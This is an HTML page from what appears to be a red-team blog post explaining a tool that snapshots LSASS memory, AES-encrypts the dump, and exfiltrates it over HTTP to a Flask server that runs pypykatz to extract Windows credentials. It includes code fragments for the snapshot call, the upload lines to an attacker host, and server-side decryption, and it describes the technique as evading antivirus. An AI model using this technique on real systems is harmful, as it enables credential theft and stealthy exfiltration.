@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Remote LSASS Snapshot Dump with AES Encryption and HTTP ExfiltrationOverviewIn this post, we’ll walk through a project that captures a snapshot of LSASS (Local Security Authority Subsystem Service) us">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Remote LSASS Snapshot Dump">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Remote LSASS Snapshot Dump with AES Encryption and HTTP ExfiltrationOverviewIn this post, we’ll walk through a project that captures a snapshot of LSASS (Local Security Authority Subsystem Service) us">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-06-01T11:53:43.000Z">
+<meta property="article:modified_time" content="2025-06-01T09:01:28.108Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="RedTeam">
+<meta property="article:tag" content="Lsass">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>Remote LSASS Snapshot Dump</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/30/Cloudgoat-Vulnerable-Cognito/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&text=Remote LSASS Snapshot Dump"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&is_video=false&description=Remote LSASS Snapshot Dump"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Remote LSASS Snapshot Dump&body=Check out this article: https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&name=Remote LSASS Snapshot Dump&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&t=Remote LSASS Snapshot Dump"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration"><span class="toc-number">1.</span> <span class="toc-text">Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Components"><span class="toc-number">1.2.</span> <span class="toc-text">Components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Client-Side-Windows-C"><span class="toc-number">1.2.1.</span> <span class="toc-text">Client-Side (Windows C++)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Side-Python-Flask"><span class="toc-number">1.2.2.</span> <span class="toc-text">Server-Side (Python Flask)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AES-Encryption-Logic"><span class="toc-number">1.3.</span> <span class="toc-text">AES Encryption Logic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSASS-Snapshot-Capture"><span class="toc-number">1.4.</span> <span class="toc-text">LSASS Snapshot Capture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Upload-with-WinHTTP"><span class="toc-number">1.5.</span> <span class="toc-text">HTTP Upload with WinHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-Server-Logic"><span class="toc-number">1.6.</span> <span class="toc-text">Flask Server Logic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Extraction"><span class="toc-number">1.7.</span> <span class="toc-text">Credential Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-Output"><span class="toc-number">1.8.</span> <span class="toc-text">Example Output</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Ethical-Reminder"><span class="toc-number">1.9.</span> <span class="toc-text">Security &amp; Ethical Reminder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Remote LSASS Snapshot Dump
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-01T11:53:43.000Z" class="dt-published" itemprop="datePublished">2025-06-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Lsass/" rel="tag">Lsass</a>, <a class="p-category" href="/tags/RedTeam/" rel="tag">RedTeam</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration"><a href="#Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration" class="headerlink" title="Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration"></a>Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>In this post, we’ll walk through a project that captures a snapshot of LSASS (Local Security Authority Subsystem Service) using Windows APIs, encrypts the dump using AES-256 in CBC mode, and securely uploads it via HTTP to a Flask-based server. The server then decrypts and parses the data using pypykatz.</p>
+<p>This approach avoids directly dumping LSASS to disk, leveraging modern snapshotting features (PssCaptureSnapshot) and encryption for stealth and safety.</p>
+<h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><h3 id="Client-Side-Windows-C"><a href="#Client-Side-Windows-C" class="headerlink" title="Client-Side (Windows C++)"></a>Client-Side (Windows C++)</h3><ul>
+<li><p>Captures LSASS process snapshot with PssCaptureSnapshot.</p>
+</li>
+<li><p>Uses MiniDumpWriteDump to write to a temp file.</p>
+</li>
+<li><p>Encrypts the dump using AES-256-CBC via bcrypt.</p>
+</li>
+<li><p>Sends encrypted data, IV, and key via WinHTTP POST.</p>
+</li>
+</ul>
+<h3 id="Server-Side-Python-Flask"><a href="#Server-Side-Python-Flask" class="headerlink" title="Server-Side (Python Flask)"></a>Server-Side (Python Flask)</h3><ul>
+<li><p>Accepts uploads from clients at three endpoints: &#x2F;upload&#x2F;key, &#x2F;upload&#x2F;iv, &#x2F;upload&#x2F;dump.</p>
+</li>
+<li><p>Decrypts received dump.</p>
+</li>
+<li><p>Runs pypykatz on it to extract credentials.</p>
+</li>
+</ul>
+<h2 id="AES-Encryption-Logic"><a href="#AES-Encryption-Logic" class="headerlink" title="AES Encryption Logic"></a>AES Encryption Logic</h2><p>AES encryption is implemented using the bcrypt API, which is the recommended CNG (Cryptography Next Generation) library on Windows.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool AesEncrypt(const std::vector&lt;BYTE&gt;&amp; plaintext, const std::vector&lt;BYTE&gt;&amp; key,</span><br><span class="line">                std::vector&lt;BYTE&gt;&amp; ciphertext, std::vector&lt;BYTE&gt;&amp; ivOut)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>The key must be 16, 24, or 32 bytes (AES-128, AES-192, AES-256).</p>
+</li>
+<li><p>CBC mode is used with a randomly generated 16-byte IV.</p>
+</li>
+<li><p>The ciphertext is padded using <strong>PKCS#7</strong> via <code>BCRYPT_BLOCK_PADDING</code>.</p>
+</li>
+</ul>
+<h2 id="LSASS-Snapshot-Capture"><a href="#LSASS-Snapshot-Capture" class="headerlink" title="LSASS Snapshot Capture"></a>LSASS Snapshot Capture</h2><p>To obtain the LSASS dump without causing antivirus alerts:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PssCaptureSnapshot(</span><br><span class="line">    hLsass,</span><br><span class="line">    PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION |</span><br><span class="line">    PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT,</span><br><span class="line">    CONTEXT_ALL,</span><br><span class="line">    &amp;snapshotHandle</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><code>PssCaptureSnapshot</code> creates a lightweight clone of the LSASS process.</p>
+</li>
+<li><p><code>MiniDumpWriteDump</code> writes the dump to a <strong>temporary file</strong>, flagged as <strong>delete-on-close</strong>.</p>
+</li>
+</ul>
+<h2 id="HTTP-Upload-with-WinHTTP"><a href="#HTTP-Upload-with-WinHTTP" class="headerlink" title="HTTP Upload with WinHTTP"></a>HTTP Upload with WinHTTP</h2><p>Data is exfiltrated over HTTP:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/key&quot;, key);</span><br><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/iv&quot;, iv);</span><br><span class="line">HttpPost(L&quot;192.168.1.9&quot;, L&quot;/upload/dump&quot;, ciphertext);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>All three components — key, IV, and dump — are sent in order.</p>
+</li>
+<li><p>The server is expected to collect and decrypt once all are received.</p>
+</li>
+</ul>
+<h2 id="Flask-Server-Logic"><a href="#Flask-Server-Logic" class="headerlink" title="Flask Server Logic"></a>Flask Server Logic</h2><p>The Python server receives the key, IV, and ciphertext:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/upload/key&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload_key():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    save_data(ip, &quot;key&quot;, request.data)</span><br></pre></td></tr></table></figure>
+<p>It stores them in memory per-client-IP, and when all are present, triggers decryption.<br>Decryption logic:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_aes_cbc(ciphertext, key, iv):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line">    return cipher.decryptor().update(ciphertext) + cipher.decryptor().finalize()</span><br></pre></td></tr></table></figure>
+<p>Padding is removed manually, and a known marker (e.g. <code>&quot;abcdefghijklmnopqurtwv&quot;</code>) is stripped to validate the structure before saving the dump to disk.</p>
+<h2 id="Credential-Extraction"><a href="#Credential-Extraction" class="headerlink" title="Credential Extraction"></a>Credential Extraction</h2><p>Once the decrypted dump is written to disk, pypykatz is invoked:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run([&quot;pypykatz&quot;, &quot;lsa&quot;, &quot;minidump&quot;, filename])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>If the dump is valid, pypykatz parses and prints credentials from LSASS.</li>
+</ul>
+<h2 id="Example-Output"><a href="#Example-Output" class="headerlink" title="Example Output"></a>Example Output</h2><p>Here’s what a successful run looks like on the client:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Generating AES key...</span><br><span class="line">[+] Starting LSASS snapshot dump using PssCaptureSnapshot...</span><br><span class="line">[*] Encrypting data...</span><br><span class="line">[+] Encryption successful!</span><br><span class="line">[*] Sending AES key...</span><br><span class="line">[*] Sending AES IV...</span><br><span class="line">[*] Sending encrypted dump...</span><br><span class="line">[+] Upload completed.</span><br></pre></td></tr></table></figure>
+<p>And on the server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[] Attempting decryption for 192.168.1.10...</span><br><span class="line">[+] Decrypted dump saved to uploads/decrypteddump_192.168.1.10_20250601_140102.bin</span><br><span class="line">[] Running pypykatz on decrypteddump...</span><br><span class="line">[+] pypykatz output:</span><br><span class="line">    [0] sekurlsa::logonpasswords</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Security-Ethical-Reminder"><a href="#Security-Ethical-Reminder" class="headerlink" title="Security &amp; Ethical Reminder"></a>Security &amp; Ethical Reminder</h2><p>This project demonstrates advanced Windows internals and encryption usage and should only be used for educational purposes, security research, or red team assessments in authorized environments.</p>
+<p>Dumping LSASS is a sensitive action and often flagged by EDR&#x2F;AV solutions. Always have proper authorization.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This toolchain demonstrates:</p>
+<ul>
+<li><p>Using modern Windows APIs (PssCaptureSnapshot) for stealthy memory capture.</p>
+</li>
+<li><p>Strong AES encryption to protect sensitive data in transit.</p>
+</li>
+<li><p>Minimal HTTP server for secure ingestion and automated credential parsing.</p>
+</li>
+</ul>
+<p>It’s an excellent example of combining Windows internals, cryptography, and Python scripting in a red team toolkit.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-LSASS-Snapshot-Dump-with-AES-Encryption-and-HTTP-Exfiltration"><span class="toc-number">1.</span> <span class="toc-text">Remote LSASS Snapshot Dump with AES Encryption and HTTP Exfiltration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Components"><span class="toc-number">1.2.</span> <span class="toc-text">Components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Client-Side-Windows-C"><span class="toc-number">1.2.1.</span> <span class="toc-text">Client-Side (Windows C++)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Side-Python-Flask"><span class="toc-number">1.2.2.</span> <span class="toc-text">Server-Side (Python Flask)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AES-Encryption-Logic"><span class="toc-number">1.3.</span> <span class="toc-text">AES Encryption Logic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSASS-Snapshot-Capture"><span class="toc-number">1.4.</span> <span class="toc-text">LSASS Snapshot Capture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Upload-with-WinHTTP"><span class="toc-number">1.5.</span> <span class="toc-text">HTTP Upload with WinHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-Server-Logic"><span class="toc-number">1.6.</span> <span class="toc-text">Flask Server Logic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Extraction"><span class="toc-number">1.7.</span> <span class="toc-text">Credential Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-Output"><span class="toc-number">1.8.</span> <span class="toc-text">Example Output</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Ethical-Reminder"><span class="toc-number">1.9.</span> <span class="toc-text">Security &amp; Ethical Reminder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&text=Remote LSASS Snapshot Dump"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&is_video=false&description=Remote LSASS Snapshot Dump"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Remote LSASS Snapshot Dump&body=Check out this article: https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&title=Remote LSASS Snapshot Dump"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&name=Remote LSASS Snapshot Dump&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/01/Remote-LSASS-Snapshot-Dump/&t=Remote LSASS Snapshot Dump"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
